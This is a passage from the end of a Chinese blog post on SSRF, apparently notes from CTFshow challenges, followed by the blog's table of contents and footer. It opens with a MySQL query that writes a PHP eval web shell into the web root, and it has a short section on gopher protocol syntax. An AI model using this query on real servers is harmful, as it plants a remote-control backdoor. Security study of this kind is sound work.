+<p> 用户为<code>root</code>，query为 <code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/shell.php&#39;;</code></p>
+</li>
+</ol>
+<h2 id="关于Gopher协议为什么后面要有一个"><a href="#关于Gopher协议为什么后面要有一个" class="headerlink" title="关于Gopher协议为什么后面要有一个_?"></a>关于Gopher协议为什么后面要有一个<code>_</code>?</h2><p>这里贴一下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Y0uhe/p/15837670.html">CTFSHOW-SSRF篇 - LinkPoc - 博客园</a>这篇博客中的一张图片：<br><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/2289942-20220124211658010-532695203.png" alt="img"></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rpup/p/18100622">CSRF 与SSRF基础 及ctfshow 练习 - 折翼的小鸟先生 - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://nanian-233.github.io/posts/ssrf.html#%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87">SSRF | Nanian233🍊’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/140337605">SSRF漏洞深入利用与防御方案绕过技巧_ssrf绕过-CSDN博客</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF-Server-Side-Request-Forgery-%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">SSRF(Server-Side Request Forgery)概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%A2%E6%88%90%E5%8E%9F%E7%90%86%E5%8F%8A%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.1.</span> <span class="toc-text">形成原理及危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">PHP中一些关键函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text">伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file-%EF%BC%88%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">file:&#x2F;&#x2F;（访问本地文件）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dict-%EF%BC%88%E6%9F%A5%E8%AF%A2%E5%AD%97%E5%85%B8%E6%9C%8D%E5%8A%A1%EF%BC%89"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">dict:&#x2F;&#x2F;（查询字典服务）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ftp-%EF%BC%88%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%EF%BC%89"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">ftp:&#x2F;&#x2F;（访问远程文件资源）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data-%EF%BC%88%E5%B5%8C%E5%85%A5%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">data:&#x2F;&#x2F;（嵌入数据）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gopher"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">gopher:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Parse-url%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text">Parse_url函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8Payload"><span class="toc-number">1.2.4.</span> <span class="toc-text">常用Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.3.</span> <span class="toc-text">题目回顾</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ImageCloud%E5%89%8D%E7%BD%AE"><span class="toc-number">1.3.1.</span> <span class="toc-text">ImageCloud前置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ImageCloud"><span class="toc-number">1.3.2.</span> <span class="toc-text">ImageCloud</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFshow%E5%88%B7%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">CTFshow刷题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web352"><span class="toc-number">1.4.1.</span> <span class="toc-text">web352</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web353"><span class="toc-number">1.4.2.</span> <span class="toc-text">web353</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web354-%E5%85%AC%E5%85%B1%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.3.</span> <span class="toc-text">web354 公共解析域名绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web355-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B61"><span class="toc-number">1.4.4.</span> <span class="toc-text">web355 长度限制1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web356-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B62"><span class="toc-number">1.4.5.</span> <span class="toc-text">web356 长度限制2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web357-%E5%86%85%E7%BD%91IP%E8%BF%87%E6%BB%A4"><span class="toc-number">1.4.6.</span> <span class="toc-text">web357 内网IP过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#filter-var-%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.6.1.</span> <span class="toc-text">filter_var() 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.4.6.2.</span> <span class="toc-text">相关过滤器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web358-%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.7.</span> <span class="toc-text">web358 @绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web359-Gopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81%E7%9A%84mysql"><span class="toc-number">1.4.8.</span> <span class="toc-text">web359 Gopher打无密码的mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web360-Gopher%E5%8D%8F%E8%AE%AE%E6%89%93redis"><span class="toc-number">1.4.9.</span> <span class="toc-text">web360 Gopher协议打redis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B7%E9%A2%98%E4%B9%8B%E5%90%8E%E7%9A%84bypass%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">刷题之后的bypass总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.1.</span> <span class="toc-text">字符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AC%E7%BD%91%E6%8C%82%E9%A9%AC"><span class="toc-number">1.5.2.</span> <span class="toc-text">公网挂马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">1.5.3.</span> <span class="toc-text">DNS重绑定</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%A1-%E5%AE%9E%E6%88%98%E5%9C%BA%E6%99%AF%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="toc-number">1.6.</span> <span class="toc-text">💡 实战场景举个例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B"><span class="toc-number">1.7.</span> <span class="toc-text">🧠 详细过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gopherus%E4%BD%BF%E7%94%A8"><span class="toc-number">1.7.1.</span> <span class="toc-text">Gopherus使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EGopher%E5%8D%8F%E8%AE%AE%E4%B8%BA%E4%BB%80%E4%B9%88%E5%90%8E%E9%9D%A2%E8%A6%81%E6%9C%89%E4%B8%80%E4%B8%AA"><span class="toc-number">1.8.</span> <span class="toc-text">关于Gopher协议为什么后面要有一个_?</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&text=SSRF学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRF学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&is_video=false&description=SSRF学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SSRF学习&body=Check out this article: http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRF学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRF学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRF学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRF学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&name=SSRF学习&description=&lt;h1 id=&#34;SSRF-Server-Side-Request-Forgery-概述&#34;&gt;&lt;a href=&#34;#SSRF-Server-Side-Request-Forgery-概述&#34; class=&#34;headerlink&#34; title=&#34;SSRF(Server-Side Request Forgery)概述&#34;&gt;&lt;/a&gt;SSRF(Server-Side Request Forgery)概述&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造)&lt;/strong&gt;,字面意思来理解就是：攻击者通过一些手段来达到伪装了一个由服务端对服务器所在内网发起的恶意请求。&lt;/p&gt;
+&lt;p&gt;也因此，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&t=SSRF学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    y@7q
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
